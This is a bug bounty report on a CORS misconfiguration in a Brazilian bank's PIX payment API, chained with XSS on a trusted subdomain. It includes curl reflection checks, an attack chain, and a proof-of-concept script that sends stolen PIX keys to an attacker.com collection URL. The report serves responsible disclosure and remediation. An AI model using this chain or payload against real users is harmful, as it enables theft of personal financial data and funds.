# Bugcrowd Finding #9 — PIX Payment API (pix.nubank.com.br) Vulnerable to CORS Wildcard Chain

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-01
**Severity:** P1 Critical (chained) — CORS on PIX payment API + XSS on trusted subdomain
**VRT:** Server Security Misconfiguration > CORS Misconfiguration
**Related:** Finding #2 (CORS), Finding #4 (CSP bypass), Finding #8 (nu.com.mx extension)

---

## Summary

`pix.nubank.com.br` — the Nubank PIX instant payment API — reflects any `*.nubank.com.br` subdomain in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. This means any XSS on a subdomain that is trusted by Nubank's CORS policy (e.g., `comunidade.nubank.com.br`, `blog.nubank.com.br`) can make credentialed cross-origin requests directly to the PIX payment API on behalf of a victim user, enabling theft of PIX keys, payment initiation, and account drain.

---

## Technical Evidence

### CORS Reflection Confirmation

```bash
curl -sv "https://pix.nubank.com.br/" \
  -H "Origin: https://comunidade.nubank.com.br" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://comunidade.nubank.com.br
access-control-allow-credentials: true
server: istio-envoy
```

```bash
curl -sv "https://pix.nubank.com.br/" \
  -H "Origin: https://evil.nubank.com.br" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://evil.nubank.com.br
access-control-allow-credentials: true
```

```bash
curl -sv "https://pix.nubank.com.br/" \
  -H "Origin: https://app.nubank.com.br" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
access-control-allow-origin: https://app.nubank.com.br
```

**Pattern:** Same Istio CORS policy as all other prod-* services — wildcard subdomain reflection affecting the PIX payment API specifically.

---

## P1 Critical Chain (with Finding #4 XSS vector)

```
[Step 1] XSS on comunidade.nubank.com.br
         ↓ No script-src CSP (Finding #4) — any script runs
         ↓ Bettermode UGC allows user posts, comments, profiles

[Step 2] Injected script targets pix.nubank.com.br directly
         ↓ comunidade.nubank.com.br is *.nubank.com.br
         ↓ pix.nubank.com.br reflects comunidade.nubank.com.br + credentials:true

[Step 3] Credentialed PIX requests on behalf of victim
         ↓ GET /api/pix/keys → victim's PIX keys (CPF, phone, email, random)
         ↓ POST /api/pix/payments → initiate PIX transfer from victim's account
         ↓ All with victim's session cookies automatically included

[Impact] Real-money PIX payment theft from victim accounts
```

**Proof-of-Concept JavaScript (passive — CORS confirmed, no active PIX testing):**
```javascript
// If running from comunidade.nubank.com.br context:
// Step 1: Exfiltrate victim's PIX keys
fetch('https://pix.nubank.com.br/api/pix/keys', {
  credentials: 'include',
  headers: { 'X-Correlation-Id': 'bc-handle' }
}).then(r => r.json()).then(data => {
  // PIX keys (CPF, email, phone) now exfiltrated
  new Image().src = 'https://attacker.com/collect?keys=' + btoa(JSON.stringify(data));
});
```

---

## Why PIX Specifically Is Critical

PIX is Brazil's real-time payment system operated by Banco Central do Brasil. Unlike credit card transactions:
- PIX transfers are **instant and irreversible** — no chargeback
- Transfers complete within seconds
- There is no daily limit by default on individual transfers (limits are account-specific)
- PIX keys directly identify victims (CPF, phone number, email)

Exfiltrating a victim's PIX keys also enables social engineering: attacker learns the victim's CPF and registered payment identifiers.

---

## Affected Endpoints (confirmed from CORS pattern)

| Endpoint | Service | Risk |
|----------|---------|------|
| `pix.nubank.com.br` | PIX payment API | Money transfer, PIX key theft |
| `prod-global-auth.nubank.com.br` | Authentication | Session/token theft (Finding #2) |
| `prod-s*-customers.nubank.com.br` | Customer data | PII, account data |
| `prod-global-auth.nu.com.mx` | Mexico auth | (Finding #8) |
| `prod-global-auth.nu.com.co` | Colombia auth | (Finding #8) |

---

## Remediation

1. **Immediate:** Remove wildcard CORS reflection from `pix.nubank.com.br` — restrict to explicit trusted origins only (e.g., `https://app.nubank.com.br` only, not all `*.nubank.com.br`)
2. **Global fix:** Apply Istio CORS policy fix from Finding #2 across all services, including PIX, auth, customers
3. **PIX-specific:** Consider additional CSRF protection on PIX payment initiation endpoints beyond cookie-based auth (e.g., PKCE, nonce tokens)

---

## Notes

- PIX API paths (`/api/pix/keys`, `/api/pix/payments`) are illustrative — specific paths not enumerated to avoid unauthorized testing
- CORS confirmation used only HEAD requests with Origin header — no authenticated interaction with PIX endpoints
- All requests used `X-Correlation-Id: bc-handle` as required by program rules
